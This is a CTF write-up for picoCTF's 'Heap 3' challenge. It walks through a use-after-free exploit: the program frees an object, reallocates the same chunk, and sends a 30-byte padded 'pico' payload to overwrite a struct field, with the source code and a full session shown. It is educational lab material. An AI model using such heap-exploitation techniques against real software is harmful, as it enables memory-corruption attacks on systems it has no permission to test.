---
title: "Heap 3"
date: "2025-07-17"
tags: ["picoCTF", "use after free", "heap"]
---

This challenge gives us a program and its source code. The program offers the following options:

```c
./chall

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice:
```

The first option prints a value and its address in memory. The second one lets us store an object on the heap using `malloc`:

```c
char* alloc = malloc(size);
printf("Data for flag: ");
fflush(stdout);
scanf("%s", alloc);
```

There is an option to free the memory of `x`:

```c
case 5:
    free_memory();
    break;
```

```c
void free_memory() {
    free(x);
}
```

Something important happens here. The program lets us free the memory chunk holding the value of `x` and then lets us write a new value on the heap. That means we can overwrite the previous content. When we free the chunk holding the word "bico", the space is marked as free, and if we ask for a new `malloc`, that same space will be used.

The goal of the challenge is to change the value of `bico` to `pico`:

```c
void check_win() {
  if (!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
}
```

So, to solve this challenge:

1. We free the chunk of `x`, leaving it free.
2. We write on the heap with `malloc`.
3. We print the flag with the matching option.

The object that goes on the heap is of type `object`:

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

object *x;
```

To overwrite the `flag` field we have to send 30 bytes (10+10+10) to fill `a`, `b` and `c`, followed by `"pico"`.

We try this:

```bash
python2 -c 'print ("A" * 30 + b"pico")'
```

Output:

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
```

Interaction with the binary:

```c
./chall

freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x138166ce  ->   bico
+-------------+-----------+

Enter your choice: 5

Enter your choice: 2
Size of object allocation: 40
Data for flag: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x138166ce  ->   pico
+-------------+-----------+

Enter your choice: 4
YOU WIN!!11!!
picoCTF{SECRETO}
```

We have the flag!
